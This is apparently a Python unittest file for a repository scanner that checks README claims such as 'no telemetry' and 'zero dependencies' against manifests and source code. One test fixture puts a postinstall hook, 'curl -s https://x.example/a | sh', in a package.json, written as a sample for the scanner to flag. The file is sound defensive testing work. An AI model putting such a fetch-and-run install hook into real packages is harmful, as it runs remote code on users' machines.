import json
import unittest

from scanrepo.context import ScanOptions
from scanrepo.engine import scan
from scanrepo.models import CONTRADICTION_CLASSES, EVIDENCE_CLASSES, Finding

from .test_scan import make_repo


def _scan(files):
    return scan(str(make_repo(files)), ScanOptions(use_external=False))


class EvidenceClassTest(unittest.TestCase):
    def test_classes_are_defined(self):
        self.assertEqual(EVIDENCE_CLASSES, ("A", "B", "C", "D"))
        self.assertEqual(CONTRADICTION_CLASSES, ("A", "B"))

    def test_default_finding_class_is_pattern(self):
        self.assertEqual(Finding("s", "r", "t", "low", 0.5).evidence_class, "C")

    def test_manifest_declared_telemetry_contradicts_with_class_b(self):
        report = _scan({
            "README.md": "No telemetry, ever.\n",
            "package.json": json.dumps({"name": "x", "license": "MIT", "dependencies": {"posthog-node": "4.0.0"}}),
            "LICENSE": "MIT License\n",
        })
        c = [x for x in report.claims if x.category == "no_telemetry"]
        self.assertEqual([x.status for x in c], ["contradicted"])
        self.assertEqual(c[0].evidence_class, "B")
        self.assertIn("manifest", c[0].verified_by[0])

    def test_zero_dependencies_is_class_b(self):
        report = _scan({"README.md": "Zero dependencies.\n", "package.json": json.dumps({"name": "x", "dependencies": {"lodash": "^4"}})})
        c = [x for x in report.claims if x.category == "zero_dependencies"]
        self.assertEqual([x.status for x in c], ["contradicted"])
        self.assertEqual(c[0].evidence_class, "B")

    def test_every_claim_has_a_falsification_test(self):
        report = _scan({"README.md": "Zero dependencies. Fully audited. 10x faster. No telemetry.\n", "src/a.py": "x = 1\n"})
        self.assertTrue(report.claims)
        self.assertTrue(all(c.test for c in report.claims))

    def test_findings_carry_a_class_and_checker(self):
        report = _scan({"README.md": "x", "src/a.py": "eval(x)\n"})
        f = [x for x in report.findings if x.rule_id == "code.py-eval-exec"][0]
        self.assertEqual(f.evidence_class, "C")

    def test_pattern_only_claim_is_never_contradicted(self):
        # "offline" is checked by referenced hosts in source only (class C)
        report = _scan({"README.md": "Works fully offline.\n", "src/a.py": "import requests\nrequests.get('https://api.example-host.dev/x')\n"})
        c = [x for x in report.claims if x.category == "offline_local"]
        self.assertTrue(c)
        self.assertNotIn("contradicted", [x.status for x in c])

    def test_structured_findings_are_class_b(self):
        report = _scan({"README.md": "x", "package.json": json.dumps({"name": "x", "scripts": {"postinstall": "curl -s https://x.example/a | sh"}})})
        f = [x for x in report.findings if x.rule_id == "dep.install-script-suspicious"]
        self.assertTrue(f)
        self.assertEqual(f[0].evidence_class, "B")
        self.assertEqual(f[0].verified_by, ["manifest-parser"])

    def test_report_shows_classes_and_falsification_tests(self):
        from scanrepo.report import to_markdown
        report = _scan({"README.md": "Zero dependencies.\n", "package.json": json.dumps({"name": "x", "dependencies": {"lodash": "^4"}})})
        md = to_markdown(report)
        self.assertIn("| Class |", md)
        self.assertIn("Falsified by any runtime dependency", md)
        self.assertIn("Only A or B can mark a claim as contradicted", md)


if __name__ == "__main__":
    unittest.main()
